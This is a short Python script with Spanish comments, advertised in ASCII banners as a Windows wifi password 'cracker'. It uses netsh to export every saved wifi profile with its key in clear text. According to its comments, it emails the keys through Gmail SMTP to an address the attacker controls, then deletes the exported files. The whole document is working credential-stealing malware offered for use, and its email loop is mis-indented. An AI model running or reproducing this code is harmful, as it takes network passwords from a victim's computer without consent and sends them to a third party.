import shutil, os
from os import remove
import tempfile 
from email import encoders 
from email.message import Message 
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.utils import parseaddr, formataddr
import smtplib
from os import remove
import shutil
import subprocess
import requests
import glob
def run():

	print("""

░██╗░░░░░░░██╗██╗███████╗██╗░░░░░░░█████╗░██████╗░░█████╗░██╗░░██╗███████╗██████╗░
░██║░░██╗░░██║██║██╔════╝██║░░░░░░██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝██║█████╗░░██║█████╗██║░░╚═╝██████╔╝███████║█████═╝░█████╗░░██████╔╝
░░████╔═████║░██║██╔══╝░░██║╚════╝██║░░██╗██╔══██╗██╔══██║██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░██║██║░░░░░██║░░░░░░╚█████╔╝██║░░██║██║░░██║██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝""")

	print("""
		crakeador de contraseñas de wifi para windows
							by:METACER""")
	try:
		os.mkdir('./NETPORT')
	except:
		pass
	#Muestra todas las redes wifi que la pc fue conectada

	show = subprocess.check_output(['netsh', 'wlan', 'show', 'profile'])
	networks = subprocess.check_output(['netsh', 'wlan', 'show', 'networks'])
	#exporta las claves de wifi en archivos .xml

	a = subprocess.check_output(['netsh', 'wlan', 'export', 'profile','key=clear'])
	#Mover archivos .xml a la carpeta wifi

	source_dir = './' #Inicio de la carpeta 

	dst = './NETPORT' #Nueva carpeta destinatario 

	files = glob.iglob(os.path.join(source_dir, "*.xml"))
	#englobar los archivos a mover


	#esto va a leer los archivos de las contraseñas para ser enviadas
	for file in files:
		if os.path.isfile(file):
			shutil.move(file, dst)
#esto enviara las claves del wifi a un correo que controlemos
	with os.scandir(dst) as ficheros:
	    for fichero in ficheros:
	    	msg = MIMEMultipart()
	password = ""# contraseña del correo desde donde se va a enviar las keys
	msg['From'] = ""# desde donde se van a enviar las keys
	msg['To'] = "" #para que correo son las keys
	msg['Subject'] = "wif_deex"#el asunto del mensaje
	msg.attach(MIMEText(open(fichero).read()))
	server = smtplib.SMTP('smtp.gmail.com: 587')
	server.starttls()
	server.login(msg['From'], password)
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	server.quit()
	#esto borrara la carpeta que contenia los archivos
	shutil.rmtree("NETPORT")
	print("""

█─█ █▀▀ █──█ █▀▀ 　 █▀▀ █▀▀ █▀▀▄ █▀▀▄ █▀▀ 　 █──█ █▀▀█ ▀█─█▀ █▀▀ 　 █▀▀█ 　 █▀▀▀ █▀▀█ █▀▀█ █▀▀▄ 
█▀▄ █▀▀ █▄▄█ ▀▀█ 　 ▀▀█ █▀▀ █──█ █──█ ▀▀█ 　 █▀▀█ █▄▄█ ─█▄█─ █▀▀ 　 █▄▄█ 　 █─▀█ █──█ █──█ █──█ 
▀─▀ ▀▀▀ ▄▄▄█ ▀▀▀ 　 ▀▀▀ ▀▀▀ ▀──▀ ▀▀▀─ ▀▀▀ 　 ▀──▀ ▀──▀ ──▀── ▀▀▀ 　 ▀──▀ 　 ▀▀▀▀ ▀▀▀▀ ▀▀▀▀ ▀▀▀─ 

█▀▀▄ █▀▀█ █──█ 　 ▄ ░█▀▀▄ 
█──█ █▄▄█ █▄▄█ 　 ─ ░█─░█ 
▀▀▀─ ▀──▀ ▄▄▄█ 　 ▀ ░█▄▄▀""")

#YBUEBOS
if __name__ == "__main__":
	run()